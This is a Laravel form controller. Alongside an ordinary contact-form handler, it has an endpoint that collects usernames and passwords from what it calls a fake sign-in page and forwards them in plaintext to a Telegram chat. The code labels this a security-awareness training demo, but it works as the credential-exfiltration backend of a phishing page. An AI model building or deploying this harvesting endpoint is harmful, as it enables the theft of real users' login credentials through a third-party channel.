<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Http\JsonResponse;
use Telegram\Bot\Laravel\Facades\Telegram;

class FormController extends Controller
{
    public function show()
    {
        return view('form');
    }

    public function submit(Request $request)
    {
        $data = $this->validateForm($request);

        $this->sendToTelegram($data);

        return back()->with('success', 'Form submitted successfully!');
    }

    public function apiSubmit(Request $request): JsonResponse
    {
        $data = $this->validateForm($request);

        $this->sendToTelegram($data);

        return response()->json(['message' => 'Form submitted successfully']);
    }

    public function apiDemoSubmit(Request $request): JsonResponse
    {
        $data = $request->validate([
            'username' => 'required|string|max:255',
            'password' => 'required|string|max:255',
        ]);

        $this->sendDemoToTelegram($data);

        return response()->json([
            'message' => 'Demo submission forwarded to Telegram',
            'data' => $data,
        ]);
    }

    private function sendDemoToTelegram(array $data): void
    {
        $text = "🎓 SECURITY AWARENESS DEMO\n"
            . "━━━━━━━━━━━━━━━━━━\n"
            . "This is a FAKE sign-in page used for training.\n\n"
            . "👤 Username/Email: {$data['username']}\n"
            . "🔑 Password: {$data['password']}";

        Telegram::sendMessage([
            'chat_id' => env('TELEGRAM_CHAT_ID'),
            'text' => $text,
            'parse_mode' => 'HTML',
        ]);
    }

    private function validateForm(Request $request): array
    {
        return $request->validate([
            'name' => 'required|string|max:255',
            'email' => 'required|email|max:255',
            'message' => 'required|string|max:5000',
        ]);
    }

    private function sendToTelegram(array $data): void
    {
        $text = "📬 New Form Submission\n"
            . "━━━━━━━━━━━━━━━━━━\n"
            . "👤 Name: {$data['name']}\n"
            . "📧 Email: {$data['email']}\n"
            . "💬 Message:\n{$data['message']}";

        Telegram::sendMessage([
            'chat_id' => env('TELEGRAM_CHAT_ID'),
            'text' => $text,
            'parse_mode' => 'HTML',
        ]);
    }
}
